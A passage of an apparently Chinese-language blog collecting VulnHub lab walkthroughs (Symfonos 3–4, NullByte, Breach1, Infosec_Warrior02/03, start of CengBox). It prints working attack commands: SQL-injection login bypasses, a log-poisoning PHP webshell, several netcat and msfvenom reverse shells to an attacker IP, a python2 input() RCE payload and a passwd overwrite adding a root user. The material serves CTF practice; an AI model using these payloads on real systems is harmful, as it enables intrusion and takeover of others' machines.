http//192.168.88.130/cgi-bin/underworld</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/05.png" alt="" /></p><h2 id="权限提升-27"><a class="markdownIt-Anchor" href="#权限提升-27"></a> 权限提升</h2><p>获取pty</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/06.png" alt="" /></p><p>查找属于用户组hades的文件</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/07.png" alt="" /></p><p>查看statuscheck.txt</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/08.png" alt="" /><br />应该是curl请求的结果</p><p>下载pspy</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/09.png" alt="" /></p><p>运行pspy之后得到信息</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/10.png" alt="" /><br />python2脚本<code>ftpclient.py</code>为计划任务</p><p>靶机上存在tcpdump</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/11.png" alt="" /></p><p>使用tcpdump监听流量<br /><code>timeout 120 tcpdump -v -i lo port 21</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/12.png" alt="" /></p><p>得到账户<code>hades:PTpZTfU4vxgzvRBE</code></p><p>使用ssh登入靶机后查看脚本文件</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/13.png" alt="" /><br />文件不可写，且目录无法操作</p><p>查看库文件<code>ftplib</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/14.png" alt="" /><br />库文件可写</p><p>修改库文件中的ftp.quit()函数</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/15.png" alt="" /><br />插入反弹Shell命令</p><p>提权成功</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/16.png" alt="" /></p><hr /><blockquote><p>ShellShock</p></blockquote><ul><li>apache</li><li>/cgi-bin/* (200)</li></ul><p>参考资料</p><blockquote><p><a href="https://infosecjohn.blog/posts/vulnhub-symfonos-3/">WalkThrough</a></p></blockquote><hr /><h1 id="symfonos-4"><a class="markdownIt-Anchor" href="#symfonos-4"></a> <a href="https://www.vulnhub.com/entry/symfonos-4,347/">symfonos 4</a></h1><p><code>2020/07/20 11:00:24</code></p><h2 id="寻找靶机ip-12"><a class="markdownIt-Anchor" href="#寻找靶机ip-12"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/00.png" alt="" /></p><h2 id="端口扫描-28"><a class="markdownIt-Anchor" href="#端口扫描-28"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.145</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/01.png" alt="" /></p><h2 id="web路径扫描-12"><a class="markdownIt-Anchor" href="#web路径扫描-12"></a> Web路径扫描</h2><p><code>gobuster dir -u 192.168.31.145 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/02.png" alt="" /></p><h2 id="漏洞利用-28"><a class="markdownIt-Anchor" href="#漏洞利用-28"></a> 漏洞利用</h2><p>访问<code>/atlantis.php</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/03.png" alt="" /></p><p>使用SQL注入Bypass登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;&#39; or 1#</span><br><span class="line">password&#x3D;1</span><br></pre></td></tr></table></figure><p>登入后跳转至<code>/sea.php</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/04.png" alt="" /></p><p>选择Hades之后出现文字内容</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/05.png" alt="" /><br />也出现了Get参数<code>file</code></p><p>访问<code>/gods</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/06.png" alt="" /><br />可能存在本地文件包含漏洞，且文件名后面会补上<code>.log</code></p><p>尝试包含登入日志<br /><code>/sea.php?file=../../../../var/log/auth</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/07.png" alt="" /><br />存在本地文件包含漏洞</p><p>ssh登入构造Webshell<br /><code>ssh '&lt;?php system($_GET['pass']); ?&gt;'@192.168.31.145</code></p><p>反弹Shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9901</span><br><span class="line">&#x2F;sea.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;auth&amp;pass&#x3D;nc -e &#x2F;bin&#x2F;bash 192.168.31.10 9901</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/08.png" alt="" /></p><h2 id="权限提升-28"><a class="markdownIt-Anchor" href="#权限提升-28"></a> 权限提升</h2><p>获取tty<br /><code>python -c 'import pty;pty.spawm(&quot;/bin/bash&quot;)'</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/09.png" alt="" /></p><p>查看本地服务<br /><code>ss -antlp</code><br /><code>ps -auxwww | grep 127.0.01</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/10.png" alt="" /></p><p>端口转发<br /><code>socat tcp-listen:1234,fork tcp-connect:localhost:8080</code></p><p>访问<code>http://192.168.31.145:1234/</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/11.png" alt="" /></p><p>查看cookie</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/12.png" alt="" /></p><p>Base64解码</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/13.png" alt="" /></p><p>可能存在pickle反序列化漏洞，构造反弹Shell的Payload</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/14.png" alt="" /></p><p>发送Payload</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/15.png" alt="" /><br />提权成功</p><hr /><blockquote><p>jsonpickle反序列化</p></blockquote><p>在进行反序列化的时候会执行<code>函数reduce</code>类似于php反序列化中的wakeup()</p><p>参考资料</p><blockquote><p><a href="https://www.hackingarticles.in/symfonos4-vulnhub-walkthrough/">WalkThrough</a><br /><a href="https://pentesterjourney.com/tag/symfonos4/">WalkThrough</a><br /><a href="https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/">pickel</a></p></blockquote><hr /><h1 id="nullbyte"><a class="markdownIt-Anchor" href="#nullbyte"></a> <a href="https://www.vulnhub.com/entry/nullbyte-1,126/">NullByte</a></h1><p><code>2020/07/31 10:52:00</code></p><h2 id="寻找靶机ip-13"><a class="markdownIt-Anchor" href="#寻找靶机ip-13"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/00.png" alt="" /></p><h2 id="端口扫描-29"><a class="markdownIt-Anchor" href="#端口扫描-29"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.234</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/01.png" alt="" /></p><h2 id="web路径扫描-13"><a class="markdownIt-Anchor" href="#web路径扫描-13"></a> Web路径扫描</h2><p><code>dirb http://192.168.31.234/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/02.png" alt="" /></p><h2 id="漏洞利用-29"><a class="markdownIt-Anchor" href="#漏洞利用-29"></a> 漏洞利用</h2><p>访问Web页面</p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/03.png" alt="" /></p><p>下载图片并分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O http:&#x2F;&#x2F;192.168.31.234&#x2F;main.gif</span><br><span class="line">exiftool main.gif</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/04.png" alt="" /></p><p>访问目录<code>/kzMb5nVYJw</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/05.png" alt="" /></p><p>查看源代码</p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/06.png" alt="" /></p><p>使用Burpsuite对POST参数<strong>key</strong>进行爆破<br />字典文件为<code>/usr/share/wordlists/dirb/big.txt</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/07.png" alt="" /></p><p>输入key之后页面变化</p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/08.png" alt="" /></p><p>提交<code>usrtosearch</code>参数进行查询</p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/09.png" alt="" /></p><p>直接访问<code>420search.php</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/10.png" alt="" /></p><p>猜测该php文件可以对数据库进行查询，可能存在SQL注入</p><p>提交参数<code>usrtosearch=admin&quot; or 1=1%23</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/11.png" alt="" /></p><p>确认存在SQL注入</p><p>使用SQLMap</p><p><code>sqlmap -u http://192.168.31.234/kzMb5nVYJw/420search.php?usrtosearch=admin --dbs --batch</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/12.png" alt="" /></p><p><code>sqlmap -u http://192.168.31.234/kzMb5nVYJw/420search.php?usrtosearch=admin -D seth --tables --batch</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/13.png" alt="" /></p><p><code>sqlmap -u http://192.168.31.234/kzMb5nVYJw/420search.php?usrtosearch=admin -D seth -T users --columns --batch</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/14.png" alt="" /></p><p><code>sqlmap -u http://192.168.31.234/kzMb5nVYJw/420search.php?usrtosearch=admin -D seth -T users -C id,position,user,pass --dump --batch</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/15.png" alt="" /></p><p>Base64解码</p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/16.png" alt="" /></p><p>Hash破解</p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/17.png" alt="" /></p><p>使用该账户登入SSH</p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/18.png" alt="" /></p><h2 id="权限提升-29"><a class="markdownIt-Anchor" href="#权限提升-29"></a> 权限提升</h2><p>查看文件<code>~/.bash_history</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/19.png" alt="" /><br />存在文件<code>/var/www/backup/procwatch</code></p><p>文件执行<code>ps</code>命令，且具有SUID权限</p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/20.png" alt="" /></p><p>进行PATH提权</p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/21.png" alt="" /></p><hr /><p>参考资料</p><blockquote><p><a href="https://medium.com/@pharish4948/vulnhub-null-byte-walkthrough-bde63c1dd38d">WalkThrough</a></p></blockquote><hr /><h1 id="breach1"><a class="markdownIt-Anchor" href="#breach1"></a> <a href="https://www.vulnhub.com/entry/breach-1,152/">Breach1</a></h1><p><code>2020/09/06 11:35:19</code></p><h2 id="寻找靶机ip-14"><a class="markdownIt-Anchor" href="#寻找靶机ip-14"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.110.0/24 | grep -B3 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/00.png" alt="" /></p><h2 id="端口扫描-30"><a class="markdownIt-Anchor" href="#端口扫描-30"></a> 端口扫描</h2><p><code>nmap --top-port 200 -sV -T5 -v -n 192.168.110.140</code></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/01.png" alt="" /></p><p>目标靶机存在IDS/IPS</p><h2 id="web路径扫描-14"><a class="markdownIt-Anchor" href="#web路径扫描-14"></a> Web路径扫描</h2><p><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.110.140/</code></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/02.png" alt="" /></p><h2 id="漏洞利用-30"><a class="markdownIt-Anchor" href="#漏洞利用-30"></a> 漏洞利用</h2><p>使用浏览器访问Web页面</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/03.png" alt="" /></p><p>查看源代码</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/04.png" alt="" /></p><p>两次Base64解码后得到<br /><code>pgibbons:damnitfeel$goodtobeagang$ta</code></p><p>图片导向其他页面</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/05.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/06.png" alt="" /></p><p>点击<code>Employee portal</code></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/07.png" alt="" /></p><p>使用账户登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: pgibbons</span><br><span class="line">password: damnitfeel$goodtobeagang$ta</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/08.png" alt="" /></p><p>在第三封邮件中获得有效信息</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/09.png" alt="" /></p><p>keystore文件<br /><code>192.168.110.140/.keystore</code></p><p>查看Contributions</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/10.png" alt="" /></p><p>可以进一步获得信息</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/11.png" alt="" /></p><p>这里可以再获取一个流量包文件<br /><code>http://192.168.110.140/impresscms/_SSL_test_phase1.pcap</code><br />并且得知密码为<code>tomcat</code></p><p>查看keystore所存储的私钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keytool -list -keystore keystore</span><br><span class="line">tomcat</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/12.png" alt="" /></p><p>导出p12证书</p><p><code>keytool -importkeystore -srckeystore keystore -destkeystore keystore.p12 -deststoretype pkcs12</code></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/13.png" alt="" /></p><p>使用Wireshark分析流量包</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/14.png" alt="" /></p><p>目标靶机的8443端口可能存在加密Web服务</p><p>导入证书文件<br /><code>Edit -&gt; Preferences -&gt; Protocols -&gt; TLS -&gt; Edit...</code></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/15.png" alt="" /></p><p>导入之后即可解密TLS流量</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/16.png" alt="" /></p><p>对于Basic认证内容进行Base64解码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC&#39; | base64 -d</span><br><span class="line">tomcat:Tt\5D8F(#!*u&#x3D;G)4m7zB</span><br></pre></td></tr></table></figure><p>访问<code>https://192.168.110.140:8443/_M@nag3Me/html</code></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/17.png" alt="" /></p><p>认证错误，使用Burpsuite代理</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/18.png" alt="" /></p><p>使用账户登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: tomcat</span><br><span class="line">password: Tt\5D8F(#!*u&#x3D;G)4m7zB</span><br></pre></td></tr></table></figure><p>构造恶意war包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;192.168.110.3 LPORT&#x3D;9902 -f raw &gt; msf.jsp</span><br><span class="line">zip msf.zip msf.jsp</span><br><span class="line">mv msf.zip msf.war</span><br></pre></td></tr></table></figure><p>上传war包</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/19.png" alt="" /></p><p>在MSFConsole中进行配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload java&#x2F;jsp_shell_reverse_tcp</span><br><span class="line">set LHOST 192.168.110.3</span><br><span class="line">set LPORT 9902</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>访问URL<code>https://192.168.110.140:8443/msf/msf.jsp</code></p><p>MSFConsole中接收到Shell</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/20.png" alt="" /></p><h2 id="权限提升-30"><a class="markdownIt-Anchor" href="#权限提升-30"></a> 权限提升</h2><p>mysql空口令登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root</span><br><span class="line">select user,password from mysql.user;</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/21.png" alt="" /></p><p>破解MD5值</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/22.png" alt="" /></p><p><code>thelaststraw</code></p><p>切换账户至milton</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su milton</span><br><span class="line">thelaststraw</span><br></pre></td></tr></table></figure><p>下载图片，查看EXIF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.110.140&#x2F;images&#x2F;bill.png</span><br><span class="line">exiftool bill.png</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/23.png" alt="" /></p><p>得到密码<br /><code>coffeestains</code></p><p>切换账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su blumbergh</span><br><span class="line">coffeestains</span><br></pre></td></tr></table></figure><p>开启本地HTTP服务<br /><code>python -m SimpleHTTPServer 9900&amp;</code><br /><img src="/images/vulnhub_walkthrough_set/Breach1/img/24.png" alt="" /></p><p>靶机下载pspy<br /><code>wget http://192.168.110.3:9900/pspy64</code><br /><img src="/images/vulnhub_walkthrough_set/Breach1/img/25.png" alt="" /></p><p>使用pspy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x pspy64</span><br><span class="line">.&#x2F;pspy64 | grep UID&#x3D;0 &amp;</span><br></pre></td></tr></table></figure><p>可以看到root执行的命令<code>/bin/sh -c /usr/share/cleanup/tidyup.sh</code></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/26.png" alt="" /></p><p>查看sudo权限，<a href="http://xn--teeshelltidy-c86sfa42ubzn74jkraw8few0g3i5f72sc.sh">可以使用tee写反弹shell命令至tidy.sh</a><br />root执行反弹shell命令之后即可获得root权限</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/27.png" alt="" /></p><p><code>echo 'nc -e /bin/bash 192.168.110.3 9903' | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh</code></p><p><code>nc -lvnp 9903</code></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/28.png" alt="" /></p><hr /><blockquote><p>keystore</p></blockquote><p>可以使用keytool查看并导出keystore中所存储的密钥文件</p><p>参考资料</p><blockquote><p><a href="https://www.cnblogs.com/zhuxr/p/9848230.html">WalkThrough</a></p></blockquote><hr /><h1 id="infosec_warrior02"><a class="markdownIt-Anchor" href="#infosec_warrior02"></a> <a href="https://www.vulnhub.com/entry/infosecwarrior-ctf-2020-02,447/">Infosec_Warrior02</a></h1><p><code>2020/09/09 12:46:57</code></p><h2 id="寻找靶机ip-15"><a class="markdownIt-Anchor" href="#寻找靶机ip-15"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.1.0/24 | grep -B3 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/00.png" alt="" /></p><h2 id="端口扫描-31"><a class="markdownIt-Anchor" href="#端口扫描-31"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -T5 -v -n 192.168.1.109</code></p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/01.png" alt="" /></p><h2 id="漏洞利用-31"><a class="markdownIt-Anchor" href="#漏洞利用-31"></a> 漏洞利用</h2><p>使用nc连接目标56563端口</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/02.png" alt="" /></p><p>尝试输入非预期输入</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/03.png" alt="" /></p><p>得到报错信息</p><p>可以利用input()函数进行RCE<br />payload: <code>__import__(&quot;os&quot;).system(&quot;/bin/bash&quot;)</code></p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/04.png" alt="" /></p><p>获取Shell</p><h2 id="权限提升-31"><a class="markdownIt-Anchor" href="#权限提升-31"></a> 权限提升</h2><p>SSH登入时得到信息</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/05.png" alt="" /></p><p>查看发型版的代号<br /><code>cat /etc/*release</code></p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/06.png" alt="" /></p><p>查看主机名与用户名</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/07.png" alt="" /></p><p>构造账户</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/08.png" alt="" /></p><p><code>hydra -I -L user -P pass -e n ssh://192.168.1.109</code></p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/09.png" alt="" /></p><p>得到账户 <code>ck04:bionic</code></p><p>SSH登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh ck04@192.168.1.109 -p bionic</span><br><span class="line">bionic</span><br></pre></td></tr></table></figure><p>输入命令之后ssh断开连接</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/10.png" alt="" /></p><p>查看ck04用户的默认Shell</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/11.png" alt="" /></p><p>构造反弹shell脚本并执行</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/12.png" alt="" /></p><p>获取tty</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/13.png" alt="" /></p><p>查看ck04用户的sudo权限并利用</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/14.png" alt="" /></p><p>查看bla用户的sudo权限</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/15.png" alt="" /></p><p>使用unzip命令覆盖passwd文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -6 hackforfun</span><br><span class="line">$6$qKge9GxrDANmLdaL$KZsmUQjuwSCG5TOZoBJW80ECpul61n9RbTRe03iL2qbdodW2bS1u2kpCHnpF.wEF4nulOxUxmkhRo&#x2F;OpUmyxe1</span><br><span class="line">echo &#39;test:$6$qKge9GxrDANmLdaL$KZsmUQjuwSCG5TOZoBJW80ECpul61n9RbTRe03iL2qbdodW2bS1u2kpCHnpF.wEF4nulOxUxmkhRo&#x2F;OpUmyxe1:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; passwd</span><br><span class="line">zip new.zip passwd</span><br><span class="line">sudo -u root &#x2F;usr&#x2F;bin&#x2F;unzip new.zip -d &#x2F;etc</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/16.png" alt="" /></p><hr /><blockquote><p>python2 input()</p></blockquote><p>python2的函数input()会执行输入的数据，插入python命令即可Getshell或反弹Shell，而使用函数raw_input()则不会执行命令</p><p>参考资料</p><blockquote><p><a href="https://hack-tips.com/2020/04/13/vulnhub-infosecwarrior-ctf-2020-02walkthrough/">WalkThrough</a></p></blockquote><hr /><h1 id="infosec_warrior03"><a class="markdownIt-Anchor" href="#infosec_warrior03"></a> <a href="https://www.vulnhub.com/entry/infosecwarrior-ctf-2020-03,449/">Infosec_Warrior03</a></h1><p><code>2020/09/21 19:24:32</code></p><h2 id="寻找靶机ip-16"><a class="markdownIt-Anchor" href="#寻找靶机ip-16"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.110.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/00.png" alt="" /></p><h2 id="端口扫描-32"><a class="markdownIt-Anchor" href="#端口扫描-32"></a> 端口扫描</h2><p><code>nmap -p- -A -T5 -v -n 192.168.110.6</code></p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/01.png" alt="" /></p><h2 id="web路径扫描-15"><a class="markdownIt-Anchor" href="#web路径扫描-15"></a> Web路径扫描</h2><p><code>dirb http://192.168.110.6/</code></p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/02.png" alt="" /></p><h2 id="漏洞利用-32"><a class="markdownIt-Anchor" href="#漏洞利用-32"></a> 漏洞利用</h2><p>访问<code>http://192.168.110.6/phpMyAdmin/</code></p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/03.png" alt="" /></p><p>使用弱口令登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:root</span><br><span class="line">password:root</span><br></pre></td></tr></table></figure><p>查询mysql.user中的账户信息</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/04.png" alt="" /></p><p>得到两个账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span><br><span class="line">krishna:4DC8EC6204F12795FE54CC79FFA2A8579A947D04</span><br></pre></td></tr></table></figure><p>进行md5查询之后得到明文口令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:root</span><br><span class="line">krishna:infosec</span><br></pre></td></tr></table></figure><p>尝试使用<code>krishna:infosec</code>登入SSH服务</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/05.png" alt="" /></p><h2 id="权限提升-32"><a class="markdownIt-Anchor" href="#权限提升-32"></a> 权限提升</h2><p>查看sudo权限</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/06.png" alt="" /></p><p>使用gcc进行提权</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/07.png" alt="" /></p><p>查看sudo权限</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/08.png" alt="" /></p><p>使用gcc进行提权</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/09.png" alt="" /></p><hr /><blockquote><p>Shell脚本提权与空格</p></blockquote><p>使用shell脚本进行sudo/suid提权时，参数中带有空格则需要使用引号</p><p>参考资料</p><blockquote><p><a href="https://www.hacknos.com/infosecwarrior-ctf-2020-03-walkthrough/">WalkThrough</a></p></blockquote><hr /><h1 id="cengbox"><a class="markdownIt-Anchor" href="#cengbox"></a> <a href="https://www.vulnhub.com/entry/cengbox-1,475/">CengBox</a></h1><p><code>2020/10/25 16:31:59</code></p><h2 id="寻找靶机ip-17"><a class="markdownIt-Anchor" href="#寻找靶机ip-17"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/00.png" alt="" /></p><h2 id="端口扫描-33"><a class="markdownIt-Anchor" href="#端口扫描-33"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -A -T5 192.168.1.104</code></p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/01.png" alt="" /></p><h2 id="web路径扫描-16"><a class="markdownIt-Anchor" href="#web路径扫描-16"></a> Web路径扫描</h2><p><code>gobuster dir -u http://192.168.1.104 -w /usr/share/wordlists/dirb/big.txt</code></p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/02.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/03.png" alt="" /></p><h2 id="漏洞利用-33"><a class="markdownIt-Anchor" href="#漏洞利用-33"></a> 漏洞利用</h2><p>访问 <code>http://192.168.1.104/masteradmin/login.php</code></p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/04.png" alt="" /></p><p>尝试SQL注入绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&#39; or 1#</span><br><span class="line">passwrod&#x3D;1</span><br></pre></td></tr></table></figure><p>绕过登录，跳转至 <code>http://192.168.1.104/masteradmin/upload.php</code></p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/05.png" alt="" /></p><p>尝试上传shell.php，返回错误信息</p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/06.png" alt="" /></p><p>更改文件名为shell.php.ceng，上传成功</p><p><img 